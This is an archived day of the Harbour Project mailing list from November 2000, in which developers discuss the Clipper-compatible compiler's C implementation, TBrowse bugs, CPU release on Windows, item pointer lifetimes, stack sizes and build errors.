> On Mon, Nov 20, 2000 at 08:32:38AM -0400, Juan Agustin Barriga wrote:
>
> > Protheus is 100% written in C++, and this is a VERY big difference. (I
> > once asked why Harbour was not, and the answer was that C++ was a too
new
> > languaje!, and I've been using it for mora than 10 years).
>
> While you might have been using an implementation of C++ for 10 years you
> need to ask yourself the question within the context of a language
> *standard* and also think about how widely that standard has been
> implemented.
>
> Now ask yourself the same question while thinking about C.
>
> If you took C++ back ten years in time a C++ programmer wouldn't recognise
> it.
>
> --
> The Harbour Project: A free software Clipper compatible compiler
> Home Page..........: http://www.harbour-project.org/
> FAQ................: http://www.harbour-project.org/faq/harbour.html
> My harbour page....: http://www.hagbard.demon.co.uk/harbour/
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
>
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
>



From harbour@lists.harbour-project.org  Mon Nov 20 10:31:02 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Mon Nov 20 10:31:02 2000
Subject: [Harbour] Harbour been cracked?
In-Reply-To: <000b01c05306$d503f750$456410ac@jharrier>; from harrier@topconnect.cl on Mon, Nov 20, 2000 at 11:30:28AM -0400
References: <004d01c05278$2899dfe0$0100007f@sl.conex.net> <20001120072112.T18577@hagbard.davep.org> <003c01c052ed$fd952270$456410ac@jharrier> <20001120125753.B18577@hagbard.davep.org> <000b01c05306$d503f750$456410ac@jharrier>
Message-ID: <20001120151913.F18577@hagbard.davep.org>

On Mon, Nov 20, 2000 at 11:30:28AM -0400, Juan Agustin Barriga wrote:

> I've seen C++ evolve over the years with no great impact on my code. And
> today I can only think that the language IS STANDARD by all means, as a
> proof I can tell you that TOPConnect is running on Win32, Linux, Sun &
> HPUX with very few #ifdefs, that would be there even if it were plain C.
> So, the "standardization" is no excuse.

I don't want to get into a whole C vs C++ thing 'cos madness lies down that
path. However, that your code has survived that all that time (I've got code
like that too) says more about how you've restricted your use of the
language than it does about the changes in the language.

Again, I'd suggest you consider how widely the standard has been
*implemented* by the various compilers out there. That's the answer to your
question about why harbour is written in ANSI C and not C++.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Mon Nov 20 11:46:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Mon Nov 20 11:46:02 2000
Subject: [Harbour] CHANGELOG: 2000-11-20 17:38 GMT+1
Message-ID: <3A195511.13D17921@libero.it>

2000-11-20 17:38 GMT+1 Maurilio Longo <maurilio.longo@libero.it>
   * source/rtl/tbrowse.prg
      ! ::aRedraw[] can change its size if header/footer separators are
added/removed
        during object life. ::Configure() can now handle this.
      ! ::PageDown() could set ::RowPos past ::RowCount. Fixed.
   * contrib/mysql/tmysql.prg
      ! fixed ::Skip() error when at eof().
   * contrib/mysql/tsqlbrw.prg
      ! missing ::Configure() call

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Mon Nov 20 11:48:01 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Mon Nov 20 11:48:01 2000
Subject: [Harbour] CHANGELOG: 2000-11-20 17:38 GMT+1
Message-ID: <3A195581.1169AFF6@libero.it>

2000-11-20 17:38 GMT+1 Maurilio Longo <maurilio.longo@libero.it>
   * source/rtl/tbrowse.prg
      ! ::aRedraw[] can change its size if header/footer separators are
added/removed
        during object life. ::Configure() can now handle this.
      ! ::PageDown() could set ::RowPos past ::RowCount. Fixed.
   * contrib/mysql/tmysql.prg
      ! fixed ::Skip() error when at eof().
   * contrib/mysql/tsqlbrw.prg
      ! missing ::Configure() call

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Mon Nov 20 12:45:03 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 20 12:45:03 2000
Subject: [Harbour] win98 and TBrowse
In-Reply-To: <000901c05179$58fe7e20$b671fea9@QUARRY>
References: <3A165F71.7B3E12E0@libero.it>
Message-ID: <200011201744.eAKHiRG03907@thor.parrett.net>

** Reply to message from "Paul Tucker" <ptucker@sympatico.ca> on Sat,
18 Nov 2000 11:05:18 -0500

> I have not yet put in the proper time to find out the
> problem - which I feel is something in Win98 since the same app will work
> fine under NT.

Whenever I run Harbour programs on Windows NT (4.0, SP6a), the entire
system slows down horribly, but the Harbour application runs fine, so
there is also a "CPU release" problem on NT.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 20 13:06:02 2000
From: harbour@lists.harbour-project.org (rglab)
Date: Mon Nov 20 13:06:02 2000
Subject: [Harbour] win98 and TBrowse
References: <3A165F71.7B3E12E0@libero.it> <200011201744.eAKHiRG03907@thor.parrett.net>
Message-ID: <3A1968F7.4983F3C0@imid.med.pl>

"David G. Holm" wrote:

> Whenever I run Harbour programs on Windows NT (4.0, SP6a), the entire
> system slows down horribly, but the Harbour application runs fine, so
> there is also a "CPU release" problem on NT.

  We have some code for CPU releasing called from hb_idleState() which
is called from INKEY(). Is it linked in your build? Maybe we have
incorrect #ifdef that is excluding the code from compilation?

Regards, Ryszard

From harbour@lists.harbour-project.org  Mon Nov 20 13:25:03 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 20 13:25:03 2000
Subject: [Harbour] win98 and TBrowse
In-Reply-To: <3A1968F7.4983F3C0@imid.med.pl>
References: <3A165F71.7B3E12E0@libero.it> <200011201744.eAKHiRG03907@thor.parrett.net>
Message-ID: <200011201824.eAKIOKG07796@thor.parrett.net>

** Reply to message from rglab <rglab@imid.med.pl> on Mon, 20 Nov 2000
19:09:59 +0100

> We have some code for CPU releasing called from hb_idleState() which
> is called from INKEY(). Is it linked in your build?

I don't see how it could fail to be linked. I am using the GNU Make
System for all of my builds and I do not get any unresolved external
symbols.

> Maybe we have incorrect #ifdef that is excluding the code from compilation?

No code is being excluded, but then again, no code is being executed,
because this is the section for 32-bit Windows apps in  hb_releaseCPU():

#if defined(HB_OS_WIN_32)
   /* according to ms docs, you should not do this in a Win app. dos
only */
#elif ...

So while this may be true for "real" Windows applications (I have no
idea if it is, because I have never created one), it is obviously not
the case for console applications, so something needs to be done here to
force Windows to do a context switch for console applications.

Could somebody who has Windows API documentation please look for an API
call that can be used to force a console application to give up CPU time?
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 20 13:44:01 2000
From: harbour@lists.harbour-project.org (rglab)
Date: Mon Nov 20 13:44:01 2000
Subject: [Harbour] Random gpfs
References: <200011171721_MC2-BB48-AF05@compuserve.com>
Message-ID: <3A1971DB.2E627140@imid.med.pl>

John Skelton wrote:

> "hb_itemNew() returns a pointer that is allocated outside of the eval
> stack so I think we don't need any new function for that"
> 
> Does this mean that something like this (typed in without compiling!)
> will be OK or not?
>   char *p = hb_parc(1);
>   ...
>   ... = hb_itemPutXXX(NULL, ...);
>   ...
>   ... = hb_itemDo(...);
>   // now is p still valid?

  Pointers returned by hb_parc() are valid during a lifetime of the
function. Currently they are deallocated after a function exit because
we are allocating a new buffer for every operation with an item which
value is a string. Later we should add a reference counting to save many
expensive memory operations (similar to Clipper) - only a pointer to a
string will be copied.
  In general all values returned by EXTEND API functions have their
lifetime equal to the lifetime of a function. They are pushed on the
eval stack directly before function call and they are removed from the
eval stack after returning from the function.

> Also, is is OK to keep the xxx below for a long time (i.e. even after
> the function has returned)?
>   xxx = hb_itemParam(n);
> I'm especially thinking of the case where param n is a code block
> and xxx is to used to access it many times - long after the ref. to
> the block is obtained.

  No. Because hb_itemParam() returns a pointer to an item allocated on
the eval stack that will be removed from it after function exit. Notice
a difference: hb_itemParam() returns a pointer to an item - it doesn't
return an item's value. To read item's value you have to use hb_parXXX()
functions. If you need to store an item's value internally in some
static area then you have to copy it into a new item. This new item can
be pre-allocated with:

static HB_ITEM myVeryImportantItem;
....
hb_itemCopy( &myVeryImportantItem, hb_itemParam(1) );

or it can be allocated dynamically with hb_itemNew()

static HB_ITEM_PTR pMyItem;
...
pMyItem = hb_itemNew( hb_itemParam(2) );
or
pMyItem = hb_itemNew( NULL );
hb_itemCopy( pMyItem, hb_itemParam(3) );

  Notice that in cases when an item's value is a complex one (arrays,
codeblocks) then the item value have to be locked with hb_gcLockItem()
call to prevent deallocation by the GC. If you call
MyFunc( { 1, 2} )
then the array is created dynamically and is placed on the eval stack
and will be removed after the function call. Notice that we are removing
an item from the eval stack here - the array itself is not released
because hb_itemCopy() has increased a reference counter for this array.
However this array can be deallocated by the GC during the nearest
hb_gcCollect() call. The GC deallocates this array because there is no
reference to this array inside any internal harbour data structure
searched by the GC (the eval stack, statics, memvars, classes)

> "Checking them at every memory operation will be too expensive"
> 
> Yes.  Except when trying to find a GPF.  Then, the overhead does not
> matter, but saving time to find out what's wrong matters a lot. :-)

  Then we can add hb_memCheck( void *pPointer ) function that can be
called before any string operation  that can be joined with current
tracing subsystem. However this will still GPF during memory checking if
this pointer is invalid. Additionally we can replace all memcpy,
memmove, etc. calls with our hb_memcpy, hb_memset, etc that will call
memory check before doing their job. All direct memory operation
(szText[ i ] = something) will have to be replaced with
hb_memPut()/hb_memGet() replacements.
Unfortunately, it seems a lot of work...

Regards, Ryszard

From harbour@lists.harbour-project.org  Mon Nov 20 14:02:01 2000
From: harbour@lists.harbour-project.org (rglab)
Date: Mon Nov 20 14:02:01 2000
Subject: [Harbour] Select()  but
References: <007601c05019$fa00e120$8604d2cc@san.rr.com> <3A14F891.3A4FC708@imid.med.pl> <002801c050c7$b4a1f200$59f6fbce@local> <3A1595D1.7F9259EF@imid.med.pl> <002501c052cf$79c47540$8604d2cc@san.rr.com>
Message-ID: <3A19762E.47F99650@imid.med.pl>

Brian Hays wrote:

> Should all functions that call this be prepared to trim any symbol names, or
> should hb_dynsymFindName either trim them or pad them to the length of a
> symbol to search?

  Yes, I think it should be trimmed before passing it down into RDD
table functions. This applies to all alias usage using and field names
although fields are RTrimmed only.

> Is there a fixed length to symbols if 10char is off???

  It is defined in hbsetup.h: HB_SYMBOL_NAME_LEN

Regards, Ryszard

From harbour@lists.harbour-project.org  Mon Nov 20 14:58:01 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Mon Nov 20 14:58:01 2000
Subject: [Harbour] diskspace
References: <003501c052d4$39d2e200$8604d2cc@san.rr.com> <026901c052da$17716730$0a0ac8c8@VECWS1>
Message-ID: <001b01c0532b$f9192e10$8604d2cc@san.rr.com>

Thanks, Victor!  I don't know how I missed it....

Brian Hays
Abacus Data Systems, Inc


Subject: Re: [Harbour] diskspace
> Check HB_DISKSPACE() which does exactly what you say :)
> 
> In fact this is the recommended function for Harbour since it has 
> some extra features and it works under Linux/Unix, too (while 
> DISKSPACE() doesn't).
> 
> Victor Szakats



From harbour@lists.harbour-project.org  Mon Nov 20 15:10:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Mon Nov 20 15:10:02 2000
Subject: [Harbour] Random gpfs
References: <200011171721_MC2-BB48-AF05@compuserve.com> <3A1971DB.2E627140@imid.med.pl>
Message-ID: <004b01c0532d$c2cc8170$8604d2cc@san.rr.com>

Ryszard:
>>Pointers returned by hb_parc() are valid during a lifetime of the
function<<

My earlier question and some of John's were related the dynamic stack
issues.
If the stack gets reallocated during the lifetime of the function because
another function is called that does a lot, there would be a problem, right?
Are the stack reallocations possible here or are there safeguards?

Brian Hays
Abacus Data Systems, Inc



From harbour@lists.harbour-project.org  Mon Nov 20 15:13:01 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Mon Nov 20 15:13:01 2000
Subject: [Harbour] bigger stack
Message-ID: <005301c0532e$1835bd70$8604d2cc@san.rr.com>

Maurilio:
I accidentally deleted the msg where you showed how to initialize a larger
stack, and I couldn't find it in the headers.
Could you tell us again, please?

Phil:
Is there a way to review old msgs for this list?

Brian Hays
Abacus Data Systems, Inc



From harbour@lists.harbour-project.org  Mon Nov 20 16:19:02 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Mon Nov 20 16:19:02 2000
Subject: [Harbour] bigger stack
In-Reply-To: <005301c0532e$1835bd70$8604d2cc@san.rr.com>
Message-ID: <202011202104.0AKL4bG22613@localhost.localdomain>

Hi Brian,

Look at harbour/source/vm/hvm.c

you should two a line with

#define STACK_INITHB_ITEMS           2000
#define STACK_EXPANDHB_ITEMS    200

These where normaly init to 100 and 20.

see you,

> Maurilio:
> I accidentally deleted the msg where you showed how to initialize a larger
> stack, and I couldn't find it in the headers. Could you tell us again,
> please?
> 
> Phil:
> Is there a way to review old msgs for this list?
> 
> Brian Hays
> Abacus Data Systems, Inc
> 
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 



Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Mon Nov 20 16:19:18 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Mon Nov 20 16:19:18 2000
Subject: [Harbour] bigger stack
Message-ID: <202011202105.0AKL5ZG23044@localhost.localdomain>

Hi Brian,

Look at harbour/source/vm/hvm.c

you should two a line with

#define STACK_INITHB_ITEMS           2000
#define STACK_EXPANDHB_ITEMS    200

These where normaly init to 100 and 20.

see you,

> Maurilio:
> I accidentally deleted the msg where you showed how to 
initialize a larger
> stack, and I couldn't find it in the headers. Could you tell us 
again,
> please?
> 
> Phil:
> Is there a way to review old msgs for this list?
> 
> Brian Hays
> Abacus Data Systems, Inc
> 
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to 
check
> http://www.Harbour-Project.org
> 
> 



Best regards,

J. Lefebvre,
Bruxelles,
Belgium


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Mon Nov 20 17:09:02 2000
From: harbour@lists.harbour-project.org (Nelson Bertolino Junior)
Date: Mon Nov 20 17:09:02 2000
Subject: [Harbour] Harbour been cracked?
References: <004d01c05278$2899dfe0$0100007f@sl.conex.net>
Message-ID: <3A19A0EC.2050100@upol.com.br>

Friends,

I've never knew anything about this, but considering the source 
(MICROSIGA), it could be true. They are a little bit dangerous ...

Regards,
Nelson

Luiz Rafael Culik Guimaraes wrote:

> Dear Friends
> 
> I´ve got the follow information from a Brazilian Harbour/Clipper User
> 
> 
>> Após 3 anos desenvolvendo e implementando soluções ERP >com FW, a Microsiga
>> (conhece?) desenvolveu internamente (ou adaptou a partir >do Harbour, não
> 
> sei
> 
>> ainda) a um custo aproximado de 2 milhões de dólares um >compilador de 64
>> bits (não acredito neste número. 32 pode ser...) chamado >advPL, ou
> 
> Protheus.
> 
>> Gera um p-code em C++ que é então compilado com o >Borland C++ 5.0. Claro,
>> pode ser compilado em Linux, Solaris ou outros bichos. Soa >familiar?
> 
> After 3 years developing and implemented solutions ERP wi FW, the Microsiga
> Company(It an Brazilian Software House) has internaly developed( or adapted
> from the Harbour) with a cost aproximadally US $ 2 million an 64 bit
> compiler ( I don´t belive in this number,32 can be) called advPL, or
> Protheus. It generate an P-Code in C++ that is compiled with Borland C++
> 5.0. It surely that can be compiled under Linux,Solaris and other platforms.
> It doesn´t sound that you know.
> 
> 
> Regards
> 
> Luiz Rafael Culik
> 
> Regards from Brazil
> 
> Luiz Rafael Culik
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 
> 




From harbour@lists.harbour-project.org  Mon Nov 20 17:20:04 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Mon Nov 20 17:20:04 2000
Subject: [Harbour] CHANGELOG: 2000-11-20 23:11 GMT+1
Message-ID: <3A19A389.A88AEE4F@libero.it>

2000-11-20 23:11 GMT+1 Maurilio Longo <maurilio.longo@libero.it>
   * source/rtl/tbrowse.prg
      ! ::PageDown() fixed bug introduced with previous change
      * ::DispCell() now faster since only one Eval(::aColumns[n]:block) is needed to
        decide cell type and color instead of three.
   * contrib/mysql/tsqlbrw.prg
      * small changes

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Mon Nov 20 17:45:03 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Mon Nov 20 17:45:03 2000
Subject: [Harbour] Random gpfs
References: <200011171721_MC2-BB48-AF05@compuserve.com> <3A1971DB.2E627140@imid.med.pl>
Message-ID: <033501c05343$b0d6df40$0a0ac8c8@VECWS1>

> static HB_ITEM myVeryImportantItem;
> ....

hb_itemInit( &myVeryImportantItem ); /* <-------- This line is needed, too */

> hb_itemCopy( &myVeryImportantItem, hb_itemParam(1) );

BTW, since itemInit()+itemCopy() call pairs are quite common, it 
would make sense to add a new itemNewCopy() or similar function for 
this.

Victor Szakats



From harbour@lists.harbour-project.org  Mon Nov 20 18:07:02 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Mon Nov 20 18:07:02 2000
Subject: [Harbour] C / C++
Message-ID: <200011201806_MC2-BB98-B020@compuserve.com>

Harrier,

Using C++ for Harbour would probably reduce the number of people
who contributed. :-(

It might also mean some of the code would be the kind of clever (*)
stuff you've surely seen. :-(

(*) appallingly awful, I really mean. (Abuse of operators, inheritance,
overloading, inline, etc.)

Sadly, all too often C++ reminds me of a WOL (**) - that's for sure
mostly the fault of the particular developer but in some cases the
semantics of C++ are not exactly intuitive.

(**) Write-Only Language

John.

From harbour@lists.harbour-project.org  Mon Nov 20 19:37:02 2000
From: harbour@lists.harbour-project.org (Luiz Rafael Culik Guimaraes)
Date: Mon Nov 20 19:37:02 2000
Subject: [Harbour] HBTEST failures
References: <000701c0531e$ad7abbc0$a64b0a0a@default>
Message-ID: <002401c05353$16ddcec0$0100007f@sl.conex.net>

Richard

>Should I be getting so many errors of HBTEST?  Should I send the whole
list?
If you are getting about +- 330 error their is no pronblem with hbtest

Regards

Luiz Rafael Culik


From harbour@lists.harbour-project.org  Mon Nov 20 19:43:03 2000
From: harbour@lists.harbour-project.org (Eduardo Rizzolo)
Date: Mon Nov 20 19:43:03 2000
Subject: [Harbour] Varios errores al compilar
References: <20001117153044.V18577@hagbard.davep.org> <LOBBKAFMMFGJIKLMEPAKCEDFDHAA.ron@profit-master.com> <20001117180425.C18577@hagbard.davep.org> <007401c050d0$0b0265a0$0b00a8c0@eduardo> <008e01c05103$a8ba3060$4cf4c4a1@gustavo> <003b01c05140$c1b07e20$0b00a8c0@eduardo> <00aa01c0516e$b30251e0$4cf4c4a1@gustavo>
Message-ID: <005701c0533b$a666ba60$0b00a8c0@eduardo>

GUSTAVO

Gracias, luego que lei tu mail, efectue las correcciones y me di cuenta que
yo estaba equivocado.

Cuando intente el enlace hace unos meses atras, no habia entendido como era,
corregi y ahora funciona!!

Tengo echo el enlace con rmake!!!  ::))))

Saludos

Eduardo Rizzolo
Posadas Misiones Argentina
fullpaint@arnet.com.ar
fullpaint@flashmail.com
icq 39280741

----- Original Message -----
From: Gustavo A. González M. <gonzalezgustavo@cantv.net>
To: <harbour@lists.harbour-project.org>
Sent: Saturday, November 18, 2000 2:39 PM
Subject: RE: [Harbour] Varios errores al compilar


> Eduardo,
>
> No se porque te esta dando errores el RMAKE, dado que el lo que haces es
> ejecutar un comando cuando una regla se cumple o no.
>
> Inicialmente el comando para ti es Clipper.exe ahora es harbour.exe, por
eso
> no entiendo cual es el error que te da, has la prueba con una rmk mas
> sencillo por ejemplo haz una mini aplicacion con tres prg, con tu clipper
tu
> lincador anterior, cuando este ok, simplemente cambia el clipper.exe por
el
> harbour.exe y añade las librerias necesarias a medida que el lincador te
de
> los mensajes de error, claro si buscas el cld.bat, sabras el nombre de las
> mismas y listo.
>
> Saludos
>
> ----- Original Message -----
> From: Eduardo Rizzolo <fullpaint@arnet.com.ar>
> To: <harbour@lists.harbour-project.org>
> Sent: Saturday, November 18, 2000 5:20 AM
> Subject: RE: [Harbour] Varios errores al compilar
>
>
> > Gustavo
> >
> > gracias por responder!!
> >
> > Respodo abajo.
> >
> > Muchas gracias
> >
> > Eduardo Rizzolo
> > Posadas Misiones Argentina
> > fullpaint@arnet.com.ar
> > fullpaint@flashmail.com
> > icq 39280741
> >
> > ----- Original Message -----
> > From: Gustavo A. González M. <gonzalezgustavo@cantv.net>
> > To: Grupo harbour <harbour@lists.harbour-project.org>
> > Sent: Saturday, November 18, 2000 2:01 AM
> > Subject: RE: [Harbour] Varios errores al compilar
> >
> >
> > > Hola eduardo.
> > >
> > > Realmente te recomiendo que no quieras llevar a harbour todo tu
programa
> > de
> > > un solo golpe.
> > >
> > > Recuerda que aunque son identicos, y ya esta casi listo, tienen
ciertas
> > > cositas que debes aprender antes de comenzar a trabajar como si nada.
> > >
> > > Te recomiendo que hagas primero pruebas, con un solo prg, luego prueba
> tus
> > > definiciones en ese prg, luego comienza a colocarles varios prg y asi
> >
> > Realmente voy a partir el sistema en pedazos, voy a empesar por
descartar
> > todo lo que tenga que ver con el Impresor Fiscal, ya que parece no tengo
> > solocion en este punto!!!
> >
> >
> > > sucesivamente hasta obtener tu objetivo. Usa tu antiguo RMAKE no te
des
> > mala
> >
> > Para nada, intente hacer unas pruebas de enlace con rmake pero me tiro
mas
> > errores y pense que este tenia problemas.
> > Si sos tan amable de pasarme un ejemplo de como utilizar con Harbour y
> > bcc32.  ::)))
> >
> > > vida con el make de borland (a menos que de verdad quieras y tengas
> tiempo
> > > para investigar).
> >
> > Supuce que se tenia que utilizar este!!! Mi error!!!  ::(((
> > >
> > > El RDD no esta 100% completado, pero ya puedes hacer pruebas.
> > >
> > > Ademas Eduardo, si llevas todo de un solo jalon, los errores que
puedan
> > > ocurrir van a ser muy dificiles de seguir, y creo que nadie va a
> analizar
> > > todo tu codigo para ver cuales son los problemas (sin menospreciar a
> nadie
> > > Ok).
> >
> > Para nada, no es esa mi intencion, solo que se mostraron problemas de
> > incompativilidad, no graves y a simple vista son dificiles de encontrar.
> > La sola mencion es para dejar constacia de el, supongo que debe haber un
> > sector que alla desarrollado esta parte de pre-procesador, y lo podran
> > corregir.
> > Pero si nadie te marca el error no va a ser posible la correccion!!!
> >
> > Entiendo perfectamente las complicaciones de la creacion de esta
> > herramienta, y para nada son estas consultas criticas, mas bien son
> > consultas!!
> >
> >
> > >
> > > Hazlo por partes y ve soltando igual por partes (en la lista), los
> errores
> > > que vayas
> > > obteniendo (en INGLES my fiend).
> >
> > I ' m so sorry. Not spiking ingles!!  ::))   Perdon!!!!
> > Creo que se escribe asi!!!!
> >
> >
> > >
> >
> > > Saludos from this side of the earth.
> > >
> > > --
> > > Gustavo A. González M.
> > > gonzalezgustavo@cantv.net
> > > Caracas - Venezuela
> > >
> > > ----- Original Message -----
> > > From: Eduardo Rizzolo <fullpaint@arnet.com.ar>
> > > To: <harbour@lists.harbour-project.org>
> > > Sent: Friday, November 17, 2000 3:53 PM
> > > Subject: [Harbour] Varios errores al compilar
> > >
> > >
> > > > Colegas
> > > >
> > > > Ante todo disculpas por enviar a una lista para lenguaje ingles,
esta
> > > > consulta en español, pero la lista de español no se mueve!!
:::(((((
> > > >
> > > > Efectue la primer compilacion, y tengo los siguientes errores:
> > > >
> > > > 1)
> > > > Esta comparacion no funciono:
> > > >          IF NUM1 # LINEA->NUMERO
> > > > Esta no tiene problemas:
> > > >          IF NUM1 != LINEA->NUMERO
> > > > 2) Adjunto build.log con detalle de compilacion
> > > > Tube problemas con el set scope to
> > > > Reemplace por ordscope() y no tube problemas.
> > > >
> > > > 3)
> > > > Tengo echa esta definicion:
> > > > #xtranslate T => aArrayVars\[13\]
> > > > Se confunde e intenta cambiar .T. generando un error.
> > > > .aArrayVars[13].  // este es el reemplazo efectuado en el ppo
> > > > Con clipper no hay problema!!
> > > > Tampoco es muy grave, con solo declarar otra variable se soluciona,
> pero
> > > hay
> > > > problema de incompatibilidad.
> > > > Seguro que ocurre el mismo error si la variable es F, y se utiliza
.F.
> > > >
> > > > 4)
> > > > Utilizo una libreria externa para un controlador fiscal!
> > > > FISCAL.LIB
> > > > Con clipper trabaja bien, pero con harbour no encuentro la forma de
> > > > enlazarla!!
> > > > Se la agrege al bcc32, pero tira error.
> > > > Que puedo hacer?
> > > >
> > > > 5)
> > > > Envio los archivos que utilizo de enlace.
> > > > Me pueden decir si esta bien asi?
> > > >
> > > >
> > > > Muchas gracias
> > > >
> > > >
> > > > Eduardo Rizzolo
> > > > Posadas Misiones Argentina
> > > > fullpaint@arnet.com.ar
> > > > fullpaint@flashmail.com
> > > > icq 39280741
> > > >
> >
> >
> > _______________________________________________
> > Harbour mailing list
> > Harbour@lists.harbour-project.org
> > http://www.matrixlist.com/mailman/listinfo/harbour
> >
> > Thank you for participating in The Harbour Project.  Be sure to check
> > http://www.Harbour-Project.org
> >
>
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
>
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
>


From harbour@lists.harbour-project.org  Mon Nov 20 19:58:02 2000
From: harbour@lists.harbour-project.org (Paul Tucker)
Date: Mon Nov 20 19:58:02 2000
Subject: [Harbour] win98 and TBrowse
References: <3A165F71.7B3E12E0@libero.it> <200011201744.eAKHiRG03907@thor.parrett.net> <200011201824.eAKIOKG07796@thor.parrett.net>
Message-ID: <00c301c05355$cb64f290$b671fea9@QUARRY>

David,

I'm sure the docs will either not mention it, or will somehow refer to the
code that does not work.

The only way we will get this to work reliably, is to switch to real mode,
release the slice, and switch back to protected mode.  There is no support
code in the NT o/s to deal with this call in protected mode.

I've been up this creek before.  <g>

Paul
----- Original Message -----
From: "David G. Holm" <dholm@jsd-llc.com>
To: <harbour@lists.harbour-project.org>
Sent: Monday, November 20, 2000 1:23 PM
Subject: Re: [Harbour] win98 and TBrowse


> ** Reply to message from rglab <rglab@imid.med.pl> on Mon, 20 Nov 2000
> 19:09:59 +0100
>
> > We have some code for CPU releasing called from hb_idleState() which
> > is called from INKEY(). Is it linked in your build?
>
> I don't see how it could fail to be linked. I am using the GNU Make
> System for all of my builds and I do not get any unresolved external
> symbols.
>
> > Maybe we have incorrect #ifdef that is excluding the code from
compilation?
>
> No code is being excluded, but then again, no code is being executed,
> because this is the section for 32-bit Windows apps in  hb_releaseCPU():
>
> #if defined(HB_OS_WIN_32)
>    /* according to ms docs, you should not do this in a Win app. dos
> only */
> #elif ...
>
> So while this may be true for "real" Windows applications (I have no
> idea if it is, because I have never created one), it is obviously not
> the case for console applications, so something needs to be done here to
> force Windows to do a context switch for console applications.
>
> Could somebody who has Windows API documentation please look for an API
> call that can be used to force a console application to give up CPU time?
> --
> David G. Holm, Set Captain and all around
> Harbour Project Clipper Compatibility fanatic.



From harbour@lists.harbour-project.org  Mon Nov 20 20:10:03 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Mon Nov 20 20:10:03 2000
Subject: [Harbour] bigger stack
In-Reply-To: <005301c0532e$1835bd70$8604d2cc@san.rr.com>
Message-ID: <3A19850C.8229.5EC2F14@localhost>

On 20 Nov 2000, at 12:11, Brian Hays wrote:

> Maurilio:
> I accidentally deleted the msg where you showed how to initialize a
> larger stack, and I couldn't find it in the headers. Could you tell us
> again, please?
> 
> Phil:
> Is there a way to review old msgs for this list?

How old?

You can find the current archives for this list since it moved to my 
machine at:

http://www.matrixlist.com/pipermail/harbour/

Before that, there is a page like that on egroups...


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Mon Nov 20 21:12:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Mon Nov 20 21:12:02 2000
Subject: [Harbour] bigger stack
References: <3A19850C.8229.5EC2F14@localhost>
Message-ID: <001101c05360$38ca6d10$8604d2cc@san.rr.com>

Perfect. Thanks!

Brian Hays
> > Phil:
> > Is there a way to review old msgs for this list?
> 
> How old?
> 
> You can find the current archives for this list since it moved to my 
> machine at:
> 
> http://www.matrixlist.com/pipermail/harbour/



From harbour@lists.harbour-project.org  Mon Nov 20 21:21:01 2000
From: harbour@lists.harbour-project.org (Richard Crosby)
Date: Mon Nov 20 21:21:01 2000
Subject: [Harbour] Help on a full build from CVS snapshot...
Message-ID: <000801c05338$bf04a300$ae4b0a0a@default>

I've downloaded the CVS snapshot.
My Borland 5.5 is working great.
I've got Flex and Bison in \harbour\bin

When I run make_b32.bat in get :

MAKE Version 5.2  Copyright (c) 1987, 2000 Borland
 bison -d  source\compiler\harbour.y   -oobj\b32\harboury.c
 bcc32 -c -Iinclude -d  -O2   -oobj\b32\harboury.obj  obj\b32\harboury.c  
Borland C++ 5.5 for Win32 Copyright (c) 1993, 2000 Borland
Error E2194: Could not find file 'obj\b32\harboury.c'

** error 1 ** deleting obj\b32\harboury.obj

Where have I gone wrong?





From harbour@lists.harbour-project.org  Mon Nov 20 22:13:02 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Mon Nov 20 22:13:02 2000
Subject: [Harbour] bigger stack
